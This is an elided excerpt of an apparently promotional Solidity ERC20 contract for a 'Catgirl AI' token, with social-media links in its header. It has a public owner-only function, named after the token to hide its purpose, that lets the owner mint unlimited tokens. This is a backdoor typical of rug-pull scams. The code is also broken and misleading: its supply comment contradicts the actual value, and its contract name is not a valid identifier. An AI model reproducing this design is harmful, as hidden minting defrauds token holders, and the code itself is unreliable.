...
//
// $CatgirlAi proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CatgirlAIofc
// 📱 Website ::https://catgirlai.tech/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CatgirlAi(uint256 amount) public onlyOwner {
 _CatgirlAi(msg.sender, amount);
    }
    ...
    function _CatgirlAi(address account, uint256 amount) internal virtual {
...
contract $CatgirlAi is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Catgirl AI", "CATGIRLAI") {
     _CatgirlAi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}